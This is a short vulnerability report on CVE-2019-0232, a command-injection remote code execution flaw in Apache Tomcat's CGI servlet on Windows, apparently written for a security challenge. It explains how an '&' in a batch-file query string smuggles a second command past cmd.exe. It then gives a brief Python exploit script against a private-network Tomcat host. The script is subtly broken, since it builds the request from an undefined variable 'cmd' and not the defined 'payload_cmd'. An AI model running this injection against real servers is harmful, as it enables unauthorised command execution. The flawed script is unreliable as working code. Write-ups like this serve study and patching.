<div align="center"><h1>CVE-2019-0232 REPORT</h1></div>

## About the vulnerability

Apache Tomcat's CGI servlet, on Windows, for the below versions, is vulnerable to RCE due to a bug in how JRE passes arguments to Windows cmd.

**On versions:** Apache Tomcat 7.0.0 to 7.0.93, 8.5.0 to 8.5.39 and 9.0.0.M1 to 9.0.17

**Pre-requisites:** CGI option enableCmdLineArguments enabled in web.xml for Apache Tomcat. This enables the CGI servlet feature. Atleast one batch file to be present in the cgi directory.

## Explanation

This vulnerability exploits the way JRE passes arguments to the Windows cmd which in turn is a feature only available in Windows cmd. Windows cmd.exe takes a string line as argument for all command line arguments to any program instead of tokenizing it into an array of strings. Any program (eg. abc.bat) run in cmd is run in a `cmd.exe` environment as `C:\Windows\system32\cmd.exe /c "abc.bat"`

Arguments passed to the batch file under `"`, its characters are copied to the new command line as it is ignoring all other meta characters until the next `"` is encountered. So a command like `abc.bat "&dir"` is translated to `C:\Windows\system32\cmd.exe /c "abc.bat "&dir""`

The metacharacter `&` in the above translation is read as a separator as cmd.exe thinks it is out of the scope of `"`. Hence, `dir` is executed after `abc.bat`. After `&` any malicious code can be injected and executed. The regex pattern accepted by JRE includes such separators like `&` and hence the above vulnerability is triggered and RCE can be obtained.

## Exploit

```
#!/usr/bin/python
import requests
def rce(url): #applies get request for the crafter url
    r = requests.get(url)
    print(r.content)

url = 'http://192.168.43.139:8080/cgi-bin/auxilary.bat?&'
payload_cmd = 'dir'
rce(url+cmd)
```
[Exploit on github](https://github.com/yash-bansod/Techmeet21-SAPTANG/blob/chall5/chall5/exploit_CVE-2019-0232.py)

This exploit was tested on Apache Tomcat 7.0.69 with JDK7 and allows RCE on the Apache Tomcat Server.

## Proof of Concept

[PoC video](https://www.youtube.com/watch?v=eXD1Mxmacco)
